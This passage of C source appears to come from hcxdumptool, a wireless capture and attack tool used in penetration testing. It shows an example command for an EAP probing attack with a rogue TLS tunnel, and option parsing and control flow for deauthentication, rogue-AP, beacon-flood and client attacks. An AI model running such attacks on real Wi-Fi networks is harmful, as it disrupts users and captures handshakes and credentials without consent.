	"clients-only EAP probing attack using PEAP tunneled sequence MS-CHAP-V2, EAP-MD5, GTC\n"
	"$ %s -i wlan0 -t 120 -o dump.pcapng --enable_status=1567 --disable_deauthentication --disable_ap_attacks --wpaent --eaptlstun --eap_server_cert=server.crt --eap_server_key=server.key --eapreq=1921:-,T:1a0104001610000102030405060708090a0b0c0d0e0f20:-,T:04010020:-,T:06:-\n"
	"\n",
	eigenname, VERSION_TAG, VERSION_YEAR,
	eigenname, eigenname, eigenname, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION_TAG, VERSION_YEAR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static int l, p1, p2;
static long int totvalue;
static struct in_addr ipaddr;
static int mccliport;
static int mcsrvport;
static int weakcandidatelenuser;
static bool rcascanflag;
static bool injectionflag;
static bool checkdriverflag;
static bool showinterfaceflag;
static bool monitormodeflag;
static bool showchannelsflag;
static bool beaconparamsflag;
static bool passiveflag;
static const char *userscanliststring;
static char *nmeaoutname;
static char *weakcandidateuser;
static char *eapreqhex;
static const char *short_options = "i:o:f:c:s:t:m:IChv";
static const struct option long_options[] =
{
	{"do_rcascan",			no_argument,		NULL,	HCX_DO_RCASCAN},
	{"rcascan_max",			required_argument,	NULL,	HCX_RCASCAN_MAX},
	{"rcascan_order",		required_argument,	NULL,	HCX_RCASCAN_ORDER},
	{"do_targetscan",		required_argument,	NULL,	HCX_DO_TARGETSCAN},
	{"reason_code",			required_argument,	NULL,	HCX_DEAUTH_REASON_CODE},
	{"disable_deauthentication",	no_argument,		NULL,	HCX_DISABLE_DEAUTHENTICATION},
	{"disable_ap_attacks",		no_argument,		NULL,	HCX_DISABLE_AP_ATTACKS},
	{"stop_ap_attacks",		required_argument,	NULL,	HCX_STOP_AP_ATTACKS},
	{"resume_ap_attacks",		required_argument,	NULL,	HCX_RESUME_AP_ATTACKS},
	{"disable_client_attacks",	no_argument,		NULL,	HCX_DISABLE_CLIENT_ATTACKS},
	{"stop_client_m2_attacks",	required_argument,	NULL,	HCX_STOP_CLIENT_M2_ATTACKS},
	{"silent",			no_argument,		NULL,	HCX_SILENT},
	{"passive",			no_argument,		NULL,	HCX_SILENT_NOCM},
	{"filterlist_ap",		required_argument,	NULL,	HCX_FILTERLIST_AP},
	{"filterlist_client",		required_argument,	NULL,	HCX_FILTERLIST_CLIENT},
	{"filterlist_ap_vendor",	required_argument,	NULL,	HCX_FILTERLIST_AP_VENDOR},
	{"filterlist_client_vendor",	required_argument,	NULL,	HCX_FILTERLIST_CLIENT_VENDOR},
	{"filtermode",			required_argument,	NULL,	HCX_FILTERMODE},
	{"bpfc",			required_argument,	NULL,	HCX_BPFC},
	{"weakcandidate	",		required_argument,	NULL,	HCX_WEAKCANDIDATE},
	{"eapoltimeout",		required_argument,	NULL,	HCX_EAPOL_TIMEOUT},
	{"eapoleaptimeout",		required_argument,	NULL,	HCX_EAPOL_EAP_TIMEOUT},
	{"active_beacon",		no_argument,		NULL,	HCX_ACTIVE_BEACON},
	{"flood_beacon",		no_argument,		NULL,	HCX_FLOOD_BEACON},
	{"infinity",			no_argument,		NULL,	HCX_INFINITY},
	{"beaconparams",		required_argument,	NULL,	HCX_BEACONPARAMS},
	{"wpaent",			no_argument,		NULL,	HCX_WPAENT},
	{"eapreq",			required_argument,	NULL,	HCX_EAPREQ},
	{"eapreq_follownak",		no_argument,		NULL,	HCX_EAPREQ_FOLLOWNAK},
	{"eaptlstun",			no_argument,		NULL,	HCX_EAPTUN},
	{"eap_server_cert",		required_argument,	NULL,	HCX_EAP_SERVER_CERT},
	{"eap_server_key",		required_argument,	NULL,	HCX_EAP_SERVER_KEY},
	{"essidlist",			required_argument,	NULL,	HCX_EXTAP_BEACON},
	{"essidlist_wpaent",		required_argument,	NULL,	HCX_EXTAP_WPAENTBEACON},
	{"use_gps_device",		required_argument,	NULL,	HCX_GPS_DEVICE},
	{"use_gpsd",			no_argument,		NULL,	HCX_GPSD},
	{"nmea",			required_argument,	NULL,	HCX_NMEA_NAME},
	{"gpio_button",			required_argument,	NULL,	HCX_GPIO_BUTTON},
	{"gpio_statusled",		required_argument,	NULL,	HCX_GPIO_STATUSLED},
	{"gpio_statusled_interval",	required_argument,	NULL,	HCX_GPIO_STATUSLED_FLASHINTERVAL},
	{"tot",				required_argument,	NULL,	HCX_TOT},
	{"error_max",			required_argument,	NULL,	HCX_ERROR_MAX},
	{"reboot",			no_argument,		NULL,	HCX_REBOOT},
	{"poweroff",			no_argument,		NULL,	HCX_POWER_OFF},
	{"enable_status",		required_argument,	NULL,	HCX_STATUS},
	{"ip",				required_argument,	NULL,	HCX_IP},
	{"server_port",			required_argument,	NULL,	HCX_SERVER_PORT},
	{"client_port",			required_argument,	NULL,	HCX_CLIENT_PORT},
	{"check_driver",		no_argument,		NULL,	HCX_CHECK_DRIVER},
	{"check_injection",		no_argument,		NULL,	HCX_CHECK_INJECTION},
	{"force_interface",		no_argument,		NULL,	HCX_FORCE_INTERFACE},
	{"version",			no_argument,		NULL,	HCX_VERSION},
	{"example",			no_argument,		NULL,	HCX_EXAMPLE},
	{"help",			no_argument,		NULL,	HCX_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;
gpiobutton = 0;
gpiostatusled = 0;
pcapngoutname = NULL;
filteraplistname = NULL;
filterclientlistname = NULL;
fimacapsize = FI_MAC;
fimacclientsize = FI_MAC;
bpfcname = NULL;
extaplistname = NULL;
extapwpaentlistname = NULL;
beaconextlistlen = 0;
eapservercertname = NULL;
eapserverkeyname = NULL;
userscanliststring = NULL;
gpsname = NULL;
nmeaoutname = NULL;
weakcandidateuser = NULL;
weakcandidatelenuser = 0;
errorcount = 0;
maxerrorcount = ERROR_MAX;
pcapngframesout = PCAPNG_FRAME_DEFAULT;
fh_nmea = NULL;
fd_pcapng = 0;
fd_devnull = 0;
rcaorder = 0;
sl = 0;
gpiostatusledflashinterval = LEDFLASHINTERVAL;
staytime = STAYTIME;
attackcount = staytime *10;
attackstopcount = ATTACKSTOP_MAX;
attackresumecount = ATTACKRESUME_MAX;
owm1m2roguemax = OW_M1M2ROGUE_MAX;
reasoncode = WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA;
myoui_client = 0;
forceinterfaceflag = false;
rcascanflag = false;
targetscanflag = false;
beaconactiveflag = false;
beaconfloodflag = false;
checkdriverflag = false;
showinterfaceflag = false;
showchannelsflag = false;
monitormodeflag = false;
beaconparamsflag = false;
wpaentflag = false;
eapreqflag = false;
eapreqfollownakflag = false;
eaptunflag = false;
totflag = false;
gpsdflag = false;
infinityflag = false;
passiveflag = false;
statusout = 0;
attackstatus = 0;
filtermode = 0;
mcip = "224.0.0.255";
mccliport = MCPORT;
mcsrvport = MCPORT;
tvtot.tv_sec = 2147483647L;
tvtot.tv_usec = 0;
eapoltimeoutvalue = EAPOLTIMEOUT;
eapoleaptimeoutvalue = EAPOLEAPTIMEOUT;
scanlistmax = SCANLIST_MAX;
tlsctx = NULL;
memset(&weakcandidate, 0, 64);
memcpy(&weakcandidate, weakcandidatedefault, 8);
memset(&phyinterfacename, 0, PHYIFNAMESIZE);
memset(&interfacename, 0, IFNAMSIZ +1);
memset(&nmeasentence, 0, NMEA_MAX);
while((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCX_INTERFACE_NAME:
		if(strlen(optarg) > IFNAMSIZ)
			{
			fprintf(stderr, "interfacename > IFNAMSIZE\n");
			exit (EXIT_FAILURE);
			}
		memcpy(&interfacename, optarg, strlen(optarg));
		break;

		case HCX_GPS_DEVICE:
		gpsname = optarg;
		gpsdflag = false;
		break;

		case HCX_GPSD:
		gpsname = NULL;
		gpsdflag = true;
		break;

		case HCX_NMEA_NAME:
		nmeaoutname = optarg;
		break;

		case HCX_CHANNEL:
		userscanliststring = optarg;
		break;

		case HCX_SCANLIST:
		sl = strtol(optarg, NULL, 10);
		if(sl > 5)
			{
			fprintf(stderr, "no predefined scanlist available\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_STAYTIME:
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 2)
			{
			fprintf(stderr, "stay time must be >= 2\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_PCAPNG_NAME:
		if(strcmp(optarg, "-") == 0)
			{
			if(isatty(STDOUT_FILENO) == 1)
				{
				fprintf(stderr, "stdout is a terminal, won't output pcapng there\n");
				exit (EXIT_FAILURE);
				}
			else
				{
				fd_devnull = open("/dev/null", O_WRONLY);
				fd_pcapng = dup(fileno(stdout));
				dup2(fd_devnull, fileno(stdout));
				}
			}
		pcapngoutname = optarg;
		break;

		case HCX_PACPNG_FRAMES:
		if(strtol(optarg, NULL, 10) == 0) pcapngframesout = strtol(optarg, NULL, 10);
		else pcapngframesout |= strtol(optarg, NULL, 10);
		break;

		case HCX_DO_RCASCAN:
		rcascanflag = true;
		break;

		case HCX_RCASCAN_MAX:
		scanlistmax = strtol(optarg, NULL, 10);
		if(scanlistmax > SCANLIST_MAX)
			{
			fprintf(stderr, "only 1...%d lines allowed\n", SCANLIST_MAX);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_RCASCAN_ORDER:
		rcaorder = strtol(optarg, NULL, 10);
		if(rcaorder > 2)
			{
			fprintf(stderr, "only 0, 1, 2 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_DO_TARGETSCAN:
		rcascanflag = true;
		targetscanflag = true;
		l= strlen(optarg);
		if((l < 12) || (l > 17))
			{
			fprintf(stderr, "error wrong MAC size %s (alowed: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66)\n", optarg);
			exit(EXIT_FAILURE);
			}
		p2 = 0;
		for(p1 = 0; p1 < l; p1++)
			{
			if(isxdigit(optarg[p1]))
				{
				optarg[p2] = optarg[p1];
				p2++;
				}
			}
		if(hex2bin(optarg, lastap, 6) == false)
			{
			fprintf(stderr, "error wrong MAC size %s (alowed: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66)\n", optarg);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_DEAUTH_REASON_CODE:
		if(!isdigit(optarg[0]))
			{
			fprintf(stderr, "wrong reason code\n");
			exit(EXIT_FAILURE);
			}
		reasoncode = strtol(optarg, NULL, 10);
		break;

		case HCX_DISABLE_CLIENT_ATTACKS:
		attackstatus |= DISABLE_CLIENT_ATTACKS;
		break;

		case HCX_STOP_CLIENT_M2_ATTACKS:
		owm1m2roguemax = strtol(optarg, NULL, 10);
		if(owm1m2roguemax < 0)
			{
			fprintf(stderr, "must be > 1");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_DISABLE_DEAUTHENTICATION:
		attackstatus |= DISABLE_DEAUTHENTICATION;
		break;

		case HCX_DISABLE_AP_ATTACKS:
		attackstatus |= DISABLE_AP_ATTACKS;
		attackstatus |= DISABLE_DEAUTHENTICATION;
		break;

		case HCX_STOP_AP_ATTACKS:
		attackstopcount = strtol(optarg, NULL, 10);
		if(attackstopcount < (STAYTIME *5))
			{
			fprintf(stderr, "must be > than %d\n", staytime *5);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_RESUME_AP_ATTACKS:
		attackresumecount = strtol(optarg, NULL, 10);
		if(attackresumecount < (STAYTIME *5 *2))
			{
			fprintf(stderr, "must be > than %d\n", staytime *5 *2);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_SILENT:
		attackstatus = SILENT;
		break;

		case HCX_SILENT_NOCM:
		passiveflag = true;
		break;

		case HCX_FILTERLIST_AP:
		if(filteraplistname != 0)
			{
			fprintf(stderr, "filterlist_ap and filterlist_ap_vendor not allowed\n");
			exit(EXIT_FAILURE);
			}
		filteraplistname = optarg;
		break;

		case HCX_FILTERLIST_AP_VENDOR:
		if(filteraplistname != 0)
			{
			fprintf(stderr, "filterlist_ap_vendor and filterlist_ap not allowed\n");
			exit(EXIT_FAILURE);
			}
		filteraplistname = optarg;
		fimacapsize = FI_VENDOR;
		break;

		case HCX_FILTERLIST_CLIENT:
		if(filterclientlistname != 0)
			{
			fprintf(stderr, "filterlist_client_vendor and filterlist_client_vendor not allowed\n");
			exit(EXIT_FAILURE);
			}
		filterclientlistname = optarg;
		break;

		case HCX_FILTERLIST_CLIENT_VENDOR:
		if(filterclientlistname != 0)
			{
			fprintf(stderr, "filterlist_client_vendor and filterlist_client not allowed\n");
			exit(EXIT_FAILURE);
			}
		filterclientlistname = optarg;
		fimacclientsize = FI_VENDOR;
		break;

		case HCX_FILTERMODE:
		filtermode = strtol(optarg, NULL, 10);
		if((filtermode < 0) || (filtermode > 2))
			{
			fprintf(stderr, "only 0, 1 and 2 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_BPFC:
		bpfcname = optarg;
		break;

		case HCX_WEAKCANDIDATE:
		weakcandidateuser = optarg;
		weakcandidatelenuser = strlen(weakcandidateuser);
		if((weakcandidatelenuser < 8) || (weakcandidatelenuser > 63))
			{
			fprintf(stderr, "only length 8...63 characters allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_EAPOL_TIMEOUT:
		eapoltimeoutvalue = strtol(optarg, NULL, 10);
		if(eapoltimeoutvalue <= 0)
			{
			fprintf(stderr, "EAPOL TIMEOUT must be > 0\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_EAPOL_EAP_TIMEOUT:
		eapoleaptimeoutvalue = strtol(optarg, NULL, 10);
		if(eapoleaptimeoutvalue <= 0)
			{
			fprintf(stderr, "EAPOL EAP TIMEOUT must be > 0\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_ACTIVE_BEACON:
		beaconactiveflag = true;
		break;

		case HCX_FLOOD_BEACON:
		beaconfloodflag = true;
		break;

		case HCX_INFINITY:
		infinityflag = true;
		break;

		case HCX_EXTAP_BEACON:
		extaplistname = optarg;
		break;

		case HCX_EXTAP_WPAENTBEACON:
		extapwpaentlistname = optarg;
		break;

		case HCX_BEACONPARAMS:
		if((strlen(optarg) % 2) > 0)
			{
			fprintf(stderr, "beacon parameter error odd hex string length, only full hex bytes allowed\n");
			exit(EXIT_FAILURE);
			}
		if(ishexvalue(optarg, strlen(optarg)) == false)
			{
			fprintf(stderr, "beacon parameter error reading hex string\n");
			exit(EXIT_FAILURE);
			}
		if(strlen(optarg) > 0)
			{
			make_beacon_tagparams(optarg);
			beaconparamsflag = true;
			}
		break;

		case HCX_WPAENT:
		wpaentflag = true;
		break;

		case HCX_EAPREQ:
		eapreqhex = optarg;
		eapreqflag = true;
		break;

		case HCX_EAPREQ_FOLLOWNAK:
		eapreqfollownakflag = true;
		break;

		case HCX_EAPTUN:
		eaptunflag = true;
		break;

		case HCX_EAP_SERVER_CERT:
		eapservercertname = optarg;
		break;

		case HCX_EAP_SERVER_KEY:
		eapserverkeyname = optarg;
		break;

		case HCX_GPIO_BUTTON:
		gpiobutton = strtol(optarg, NULL, 10);
		if((gpiobutton < 2) || (gpiobutton > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED:
		gpiostatusled = strtol(optarg, NULL, 10);
		if((gpiostatusled < 2) || (gpiostatusled > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED_FLASHINTERVAL:
		gpiostatusledflashinterval = strtol(optarg, NULL, 10);
		if(gpiostatusledflashinterval < 5)
			{
			fprintf(stderr, "minimum flash interval is 5 seconds\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_TOT:
		if(!isdigit(optarg[0]))
			{
			fprintf(stderr, "status must be a digit\n");
			exit(EXIT_FAILURE);
			}
		totvalue = strtol(optarg, NULL, 10);
		if(totvalue < 2)
			{
			fprintf(stderr, "tot must be >= 2 (minutes)\n");
			exit(EXIT_FAILURE);
			}
		gettimeofday(&tvtot, NULL);
		tvtot.tv_sec += totvalue *60;
		break;

		case HCX_ERROR_MAX:
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case HCX_REBOOT:
		rebootflag = true;
		break;

		case HCX_POWER_OFF:
		poweroffflag = true;
		break;

		case HCX_STATUS:
		if(!isdigit(optarg[0]))
			{
			fprintf(stderr, "status must be a digit\n");
			exit(EXIT_FAILURE);
			}
		statusout |= strtol(optarg, NULL, 10);
		break;

		case HCX_CHECK_DRIVER:
		checkdriverflag = true;
		break;

		case HCX_CHECK_INJECTION:
		injectionflag = true;
		break;

		case HCX_FORCE_INTERFACE:
		forceinterfaceflag = true;
		break;

		case HCX_SHOW_INTERFACES:
		showinterfaceflag = true;
		break;

		case HCX_SET_MONITORMODE:
		if(strlen(optarg) > IFNAMSIZ)
			{
			fprintf(stderr, "interfacename > IFNAMSIZE\n");
			exit (EXIT_FAILURE);
			}
		memcpy(&interfacename, optarg, strlen(optarg));
		monitormodeflag = true;
		break;

		case HCX_SHOW_CHANNELS:
		showchannelsflag = true;
		break;

		case HCX_IP:
		if(inet_aton(optarg, &ipaddr) == 0)
			{
			fprintf(stderr, "wrong IP address\n");
			exit(EXIT_FAILURE);
			}
		mcip = optarg;
		break;

		case HCX_SERVER_PORT:
		mcsrvport = strtol(optarg, NULL, 10);
		if((mcsrvport < 1) || (mcsrvport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_SERVER;
		break;

		case HCX_CLIENT_PORT:
		mccliport = strtol(optarg, NULL, 10);
		if((mccliport < 1) || (mccliport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_CLIENT;
		break;

		case HCX_HELP:
		usage(basename(argv[0]));
		break;

		case HCX_EXAMPLE:
		exampleusage(basename(argv[0]));
		break;

		case HCX_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}

setbuf(stdout, NULL);
if(argc < 2)
	{
	fprintf(stderr, "no option selected\nrun %s --help to get more information\n", (basename(argv[0])));
	exit(EXIT_FAILURE);
	}

if((argc == 3) && (monitormodeflag ==false) && (interfacename[0] != 0))
	{
	fprintf(stderr, "not enough options selected for an attack vector\nrun %s --help to get more information\n", (basename(argv[0])));
	exit(EXIT_FAILURE);
	}

if(evpinitwpa() == false)
	{
	fprintf(stderr, "EVP initialization failed\n");
	exit(EXIT_FAILURE);
	}

if(infinityflag == true)
	{
	owm1m2roguemax = 1000000;
	attackstopcount = 1000000;
	}

if(interfacename[0] != 0) getphyifname();

if((rebootflag == true) && (poweroffflag == true))
	{
	fprintf(stderr, "setting poweroff and reboot together is not allowed\n");
	exit(EXIT_FAILURE);
	}

if(showinterfaceflag == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

if(monitormodeflag == true)
	{
	if(getuid() != 0)
		{
		fprintf(stderr, "this program requires root privileges\n");
		globalclose();
		}
	if(interfacename[0] == 0)
		{
		fprintf(stderr, "no interface specified\n");
		exit(EXIT_FAILURE);
		}
	if(opensocket(passiveflag) == false)
		{
		fprintf(stderr, "failed to init socket\n");
		exit(EXIT_FAILURE);
		}
	fprintf(stdout, "setting interface %s to monitor mode\n", interfacename);
	return EXIT_SUCCESS;
	}

if((eaptunflag == true) && ((eapservercertname == NULL) || (eapserverkeyname == NULL)))
	{
	fprintf(stderr, "EAP TLS tunnel Server Cert or Server Key file not given\n");
	exit(EXIT_FAILURE);
	}
if((eaptunflag == true) && (eapreqflag == false))
	{
	fprintf(stderr, "EAP TLS tunnel activated without EAP Request sequence\n");
	exit(EXIT_FAILURE);
	}
if((eapreqflag == true) && ((attackstatus &DISABLE_CLIENT_ATTACKS) == DISABLE_CLIENT_ATTACKS))
	{
	fprintf(stderr, "EAP requests are activated while CLIENT Attacks are disabled\n");
	exit(EXIT_FAILURE);
	}

fprintf(stdout, "initialization of %s %s (depending on the capabilities of the device, this may take some time)...\n", basename(argv[0]), VERSION_TAG);
if(phyinterfacename[0] != 0)
	{
	if(isinterfaceshared() == true) fprintf(stderr, "\nwarning: interface %s (%s) is shared\nhcxdumptool may not work as expected on shared physical devices\n\n", interfacename, phyinterfacename);
	}
if(checkdriverflag == true) fprintf(stdout, "starting driver test...\n");
if(globalinit() == false)
	{
	fprintf(stderr, "initialization failed\n");
	errorcount++;
	globalclose();
	}

if(weakcandidateuser != NULL)
	{
	memcpy(&weakcandidate, weakcandidateuser, weakcandidatelenuser);
	weakcandidatelen = weakcandidatelenuser;
	}

if((statusout &STATUS_CLIENT) == STATUS_CLIENT)
	{
	if(pcapngoutname != NULL)
		{
		if(strcmp(pcapngoutname, "+") == 0)
			{
			fprintf(stderr, "client mode, can not send pcapng dump to clients\n");
			fd_pcapng = 0;
			pcapngoutname = NULL;
			}
		}
	if(openmcclisocket(mccliport) == true) process_server();
	process_server();
	globalclose();
	}

if(interfacename[0] == 0)
	{
	fprintf(stderr, "no interface specified\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	globalclose();
	}

loadfiles();

if(beaconparamsflag == false) make_beacon_tagparams(NULL);

if(eapreqflag == true)
	{
	if(processeapreqlist(eapreqhex) == false)
		{
		fprintf(stderr, "failed reading EAP request list\n");
		exit (EXIT_FAILURE);
		}
	}

if(opensocket(passiveflag) == false)
	{
 	fprintf(stderr, "warning: failed to init socket\n");
	errorcount++;
	globalclose();
	}

if((statusout &STATUS_SERVER) == STATUS_SERVER)
	{
	if(openmcsrvsocket(mcsrvport) == false)
		{
		errorcount++;
		globalclose();
		}
	}

if(showchannelsflag == true)
	{
	show_channels();
	globalclose();
	}

if(checkdriverflag == true)
	{
	fprintf(stdout, "detected driver: %s\n", drivername);
	if(set_channel_test(2412) == false) errorcount++;
	if(errorcount == 0) fprintf(stdout, "driver tests passed...\nall required ioctl() system calls are supported by driver\n");
	else fprintf(stderr, "%d driver error(s) encountered during the test - monitor mode and ioctl() system calls failed\n", errorcount);
	globalclose();
	return EXIT_SUCCESS;
	}

if(injectionflag == true)
	{
	if(userscanliststring == NULL) getscanlist();
	else getscanlistchannel(userscanliststring);
	process_fd_injection();
	globalclose();
	return EXIT_SUCCESS;
	}

if(sl == 1) getscanlistchannel(channelscanlist1);
else if(sl == 2) getscanlistchannel(channelscanlist2);
else if(sl == 3) getscanlistchannel(channelscanlist3);
else if(sl == 4) getscanlistchannel(channelscanlist4);
else if(userscanliststring != NULL) getscanlistchannel(userscanliststring);
else getscanlist();

if(ptrfscanlist == fscanlist)
	{
	fprintf(stderr, "no frequencies available\n");
	errorcount++;
	globalclose();
	}

if(pcapngoutname != NULL)
	{
	if(strcmp(pcapngoutname, "-") == 0)
		{
		fd_pcapng = hcxcreatepcapngdumpfd(fd_pcapng, mac_orig, interfacename, mac_myap, myrc, myanonce, mac_myclient, mysnonce, weakcandidatelen, weakcandidate);
		}
	else if(strcmp(pcapngoutname, "+") != 0)
		{
		fd_pcapng = hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename, mac_myap, myrc, myanonce, mac_myclient, mysnonce, weakcandidatelen, weakcandidate);
		}
	if(fd_pcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", pcapngoutname);
		errorcount++;
		globalclose();
		}
	}

if(nmeaoutname != NULL)
	{
	if((gpsname == NULL) && (gpsdflag == false))
		{
		fprintf(stderr, "no GPS device selected\n");
		errorcount++;
		globalclose();
		}
	if((fh_nmea = fopen(nmeaoutname, "a")) == NULL)
		{
		perror("failed to open NMEA 0183 dump file");
		errorcount++;
		globalclose();
		}
	setbuf(fh_nmea, NULL);
	}
if((gpsname != NULL) || (gpsdflag == true)) opengps();

if(rcascanflag == false)
	{
	if(passiveflag == false) process_fd();
	else process_no_cm_fd();
	}
else process_fd_rca();
if(evpdeinitwpa() == false)
	{
	fprintf(stderr, "EVP initialization failed\n");
	exit(EXIT_FAILURE);
	}
globalclose();
return EXIT_SUCCESS;
}
/*===========================================================================*/
